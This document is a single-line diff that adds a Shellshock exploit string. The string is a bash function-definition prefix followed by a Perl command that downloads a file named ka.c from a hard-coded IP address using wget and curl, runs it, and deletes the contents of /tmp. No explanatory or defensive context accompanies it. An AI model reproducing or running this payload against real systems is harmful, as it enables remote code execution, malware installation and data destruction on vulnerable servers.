@@ -1,0 +1,1 @@
+() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://36.97.143.96/ka.c -O /tmp/ka.c;curl -O /tmp/ka.c http://36.97.143.96/ka.c;perl /tmp/ka.c ; rm -rf ka.* ; rm -rf /tmp/* ;rm -f /tmp/* ");'
